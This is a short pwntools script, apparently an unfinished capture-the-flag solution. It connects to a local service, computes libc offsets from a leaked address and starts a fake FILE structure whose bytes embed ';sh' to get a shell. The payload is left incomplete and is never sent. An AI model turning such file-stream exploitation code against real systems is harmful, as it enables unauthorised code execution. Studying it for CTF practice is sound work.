from pwn import *

context.arch = 'amd64'
HOST, PORT = '0.0.0.0', 31337
r = remote(HOST, PORT)

libc=int(r.recvline().strip(),16)-0x21a780
system=libc+0x50d60
_IO_wfile_jumps=libc+0x2160c0
stdout = libc+0x21a780


fs = flat([
    b'\x01\x01\x01\x01;sh\x00',
    
])

r.interactive()